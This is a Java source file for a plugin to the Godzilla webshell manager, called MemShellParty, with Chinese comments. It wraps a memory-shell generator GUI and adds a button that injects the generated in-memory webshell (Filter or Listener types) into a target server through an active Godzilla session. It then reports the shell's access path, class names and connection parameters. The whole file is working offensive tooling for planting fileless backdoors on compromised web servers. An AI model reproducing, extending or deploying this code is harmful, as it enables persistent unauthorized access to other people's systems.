package shells.plugins.java;

import com.reajason.javaweb.desktop.memshell.extension.GuiExtension;
import com.reajason.javaweb.desktop.memshell.extension.ResultAction;
import com.reajason.javaweb.desktop.memshell.model.DesktopMemShellGenerateResult;
import com.reajason.javaweb.desktop.memshell.model.InfoRow;
import com.reajason.javaweb.desktop.memshell.service.ResultInfoService;
import com.reajason.javaweb.desktop.memshell.ui.MemShellGeneratorFrame;
import com.reajason.javaweb.desktop.memshell.util.StatusReporter;
import com.reajason.javaweb.desktop.memshell.util.SwingUiUtil;
import com.reajason.javaweb.godzilla.GodzillaInjector;
import com.reajason.javaweb.memshell.MemShellResult;
import com.reajason.javaweb.memshell.ShellType;
import core.Encoding;
import core.annotation.PluginAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.dialog.GOptionPane;
import util.Log;

import javax.swing.BorderFactory;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTextArea;
import javax.swing.SwingUtilities;
import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Dimension;
import java.awt.Font;
import java.util.Collections;
import java.util.List;
import java.util.concurrent.Callable;

/**
 * Godzilla 插件入口。
 *
 * <p>界面完全复用 GUI SDK 的 {@link MemShellGeneratorFrame}（standalone=false，取 rootPanel 内嵌）：
 * 配置表单、工具参数与结果页签都由 SDK 提供。插件使用无打包模式：不展示打包分类/变体，
 * 生成结果固定按 Base64 展示——注入只需要原始的 {@code MemShellResult}，不需要先打包；
 * 插件再补一个 {@link ResultAction}「注入内存马」，生成成功后出现在结果区，点击才真正下发到当前会话。
 *
 * <p>生成发生在 SDK 的 SwingWorker 里；注入放在后台线程，结果与连接信息通过对话框展示，
 * 过程状态写到插件底部状态行（与桌面发行版接 StatusReporter 的方式一致）。
 *
 * <p>类名与包名由 Godzilla 的插件扫描规则决定：{@code shells/plugins/<语言>/<类名>.class}，
 * 且必须直接实现 {@link Plugin} 并带 {@link PluginAnnotation}。
 */
@PluginAnnotation(payloadName = "JavaDynamicPayload", Name = "MemShellParty", DisplayName = "内存马Party")
public class MemShellParty implements Plugin {

    private final JPanel view = new JPanel(new BorderLayout());
    private final JLabel statusLabel = new JLabel("就绪");
    private final Color normalForeground;
    private final StatusReporter statusReporter;
    private final ResultAction injectAction = new InjectAction();
    private final MemShellGeneratorFrame frame;

    private volatile Payload payload;
    private volatile Encoding encoding;
    private volatile boolean injecting;

    public MemShellParty() {
        this.normalForeground = statusLabel.getForeground();
        this.statusReporter = new StatusReporter() {
            @Override
            public void report(final String message, final Level level) {
                SwingUtilities.invokeLater(new Runnable() {
                    @Override
                    public void run() {
                        applyStatus(message, level);
                    }
                });
            }
        };

        final List<GuiExtension> extensions =
                Collections.<GuiExtension>singletonList(new GodzillaExtension());
        // 目录构建会触发 SPI 发现（ServiceLoader 按 TCCL 找 provider），必须在插件类加载器下构造；
        // withPacker=false：注入场景不需要选择打包方式，结果固定 Base64
        this.frame = GodzillaInjector.callWithPluginClassLoader(new Callable<MemShellGeneratorFrame>() {
            @Override
            public MemShellGeneratorFrame call() {
                return new MemShellGeneratorFrame(extensions, false, false);
            }
        });
        frame.setStatusReporter(statusReporter);

        statusLabel.setBorder(BorderFactory.createEmptyBorder(4, 8, 4, 8));
        view.add(frame.getRootPanel(), BorderLayout.CENTER);
        view.add(statusLabel, BorderLayout.SOUTH);
    }

    @Override
    public void init(ShellEntity shellEntity) {
        this.payload = shellEntity.getPayloadModule();
        this.encoding = Encoding.getEncoding(shellEntity);
    }

    @Override
    public JPanel getView() {
        return view;
    }

    /**
     * Godzilla 4.15 起 Plugin 有默认 close；4.01 没有。签名保持一致即可两边都被调用到。
     */
    public void close() {
        if (SwingUtilities.isEventDispatchThread()) {
            frame.dispose();
        } else {
            SwingUtilities.invokeLater(new Runnable() {
                @Override
                public void run() {
                    frame.dispose();
                }
            });
        }
    }

    // ---------------- 注入 ----------------

    private void startInjection(DesktopMemShellGenerateResult generated) {
        if (injecting) {
            statusReporter.report("注入正在进行中，请稍候", StatusReporter.Level.INFO);
            return;
        }
        final Payload currentPayload = payload;
        if (currentPayload == null) {
            statusReporter.report("当前会话没有可用的 Payload", StatusReporter.Level.ERROR);
            return;
        }
        final MemShellResult result = generated.getMemShellResult();
        if (result.getShellConfig() != null
                && result.getShellConfig().getShellType() != null
                && result.getShellConfig().getShellType().startsWith(ShellType.AGENT)) {
            // Agent 模板是 ClassFileTransformer，靠 attach/premain 生效，实例化不会做任何事
            String message = "Agent 类型需要 attach/premain，无法通过 Godzilla 会话直接注入；请改用 Listener、Filter 等挂载类型";
            statusReporter.report(message, StatusReporter.Level.ERROR);
            showReport("无法注入", message, true);
            return;
        }
        final Encoding currentEncoding = encoding;
        injecting = true;
        statusReporter.report("正在注入内存马…", StatusReporter.Level.BUSY);

        Thread worker = new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String output = GodzillaInjector.inject(currentPayload, currentEncoding, result);
                    statusReporter.report("注入完成", StatusReporter.Level.SUCCESS);
                    showReport("注入结果", buildReport(result, output), false);
                } catch (Throwable t) {
                    Log.error(t);
                    String message = message(t);
                    statusReporter.report("注入失败: " + message, StatusReporter.Level.ERROR);
                    showReport("注入失败", message, true);
                } finally {
                    injecting = false;
                }
            }
        }, "MemShellParty-Inject");
        worker.setDaemon(true);
        worker.start();
    }

    /**
     * 注入器返回的目标侧信息（多数模板会累积 context 结果）加上生成时的连接参数。
     */
    private static String buildReport(MemShellResult result, String output) {
        StringBuilder report = new StringBuilder();
        if (output == null || output.trim().length() == 0) {
            report.append("注入器已执行（目标未返回详细信息，可查看目标服务器日志或直接访问挂载路径验证）");
        } else {
            report.append(output.trim());
        }
        report.append("\n\n============ 连接信息 ============\n");
        report.append("地址        : ").append(urlPattern(result)).append('\n');
        if (result.getShellConfig() != null) {
            report.append("中间件/类型 : ")
                    .append(value(result.getShellConfig().getServer()))
                    .append(" / ")
                    .append(value(result.getShellConfig().getShellType()))
                    .append('\n');
            report.append("工具        : ").append(value(result.getShellConfig().getShellTool())).append('\n');
        }
        report.append("内存马类名  : ").append(value(result.getShellClassName())).append('\n');
        report.append("注入器类名  : ").append(value(result.getInjectorClassName())).append('\n');
        try {
            List<InfoRow> rows = ResultInfoService.describeTool(
                    result.getShellConfig(), result.getShellToolConfig());
            for (InfoRow row : rows) {
                report.append(row.getName()).append(": ").append(row.getValue()).append('\n');
            }
        } catch (Throwable t) {
            report.append("连接参数读取失败: ").append(message(t)).append('\n');
        }
        return report.toString();
    }

    private static String urlPattern(MemShellResult result) {
        if (result.getInjectorConfig() == null) {
            return "";
        }
        return value(result.getInjectorConfig().getUrlPattern());
    }

    private void showReport(final String title, final String text, final boolean error) {
        SwingUtilities.invokeLater(new Runnable() {
            @Override
            public void run() {
                JTextArea area = new JTextArea(text);
                area.setEditable(false);
                area.setLineWrap(true);
                area.setWrapStyleWord(true);
                area.setCaretPosition(0);
                area.setFont(new Font(Font.MONOSPACED, Font.PLAIN, 12));
                JScrollPane scrollPane = new JScrollPane(area);
                scrollPane.setPreferredSize(new Dimension(640, 280));
                GOptionPane.showMessageDialog(view, scrollPane, title,
                        error ? GOptionPane.ERROR_MESSAGE : GOptionPane.INFORMATION_MESSAGE);
            }
        });
    }

    private void applyStatus(String message, StatusReporter.Level level) {
        statusLabel.setText(message == null ? "" : message);
        Color color = normalForeground;
        if (level == StatusReporter.Level.SUCCESS) {
            color = SwingUiUtil.successColor();
        } else if (level == StatusReporter.Level.ERROR) {
            color = SwingUiUtil.errorColor();
        } else if (level == StatusReporter.Level.BUSY) {
            color = SwingUiUtil.mutedColor();
        }
        statusLabel.setForeground(color);
    }

    private static String value(String text) {
        return text == null ? "" : text;
    }

    private static String message(Throwable t) {
        Throwable current = t;
        while (current.getCause() != null && current.getMessage() == null) {
            current = current.getCause();
        }
        String message = current.getMessage();
        return message == null || message.trim().length() == 0
                ? current.getClass().getName()
                : message;
    }

    // ---------------- SDK 扩展 ----------------

    private final class GodzillaExtension implements GuiExtension {
        @Override
        public String name() {
            return "MemShellParty-Godzilla";
        }

        @Override
        public List<ResultAction> resultActions() {
            return Collections.<ResultAction>singletonList(injectAction);
        }
    }

    /**
     * 结果区动作：生成结果存在且当前会话有 Payload 时才可点。
     */
    private final class InjectAction implements ResultAction {
        @Override
        public String label() {
            return "注入内存马";
        }

        @Override
        public boolean alignRight() {
            return true;
        }

        @Override
        public boolean supports(DesktopMemShellGenerateResult result) {
            return payload != null;
        }

        @Override
        public void perform(DesktopMemShellGenerateResult result) {
            startInjection(result);
        }
    }
}
